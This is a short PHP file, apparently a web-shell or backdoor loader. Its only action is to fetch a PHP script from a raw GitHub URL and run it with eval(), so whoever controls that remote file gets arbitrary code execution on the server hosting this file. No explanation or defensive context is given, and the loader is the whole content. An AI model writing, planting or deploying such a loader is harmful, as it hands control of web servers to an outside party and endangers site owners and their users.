<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/utama.php'));

$content = "?> ".$content;
eval($content);
